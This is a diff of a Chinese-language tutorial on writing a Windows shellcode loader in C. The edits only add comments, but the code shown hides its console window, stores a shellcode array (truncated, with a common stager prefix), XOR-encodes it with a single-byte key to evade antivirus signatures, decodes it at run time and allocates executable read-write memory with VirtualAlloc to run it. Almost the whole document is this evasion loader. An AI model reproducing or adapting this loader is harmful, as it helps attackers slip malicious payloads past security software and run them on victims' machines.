@@ -16,7 +16,7 @@ c语言实现loader，代码如下
 
 #pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
 
-// length: 891 bytes
+// shellcode
 unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41...";
 
 int main() {
@@ -41,9 +41,9 @@ int main() {
 
 unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00...";
 
-int a = 1;
+int a = 1;//xor key
 int b = sizeof(buf);
-unsigned char str[891] = { 0 };
+unsigned char str[891] = { 0 };//shellcode size
 
 int main() {
     printf("char array length=%d\n", b);
@@ -71,7 +71,7 @@ unsigned char buf[] = "\xfd\x49\x82\xe5\xf1\xe9\xc9\x1...";
 
 int main() {
     for (int i = 0; i < sizeof(buf); i++) {
-        _InterlockedXor8( (volatile char *)buf + i, 1 );
+        _InterlockedXor8( (volatile char *)buf + i, 1 );//xor key
     }
     
     char* old = (char *)VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
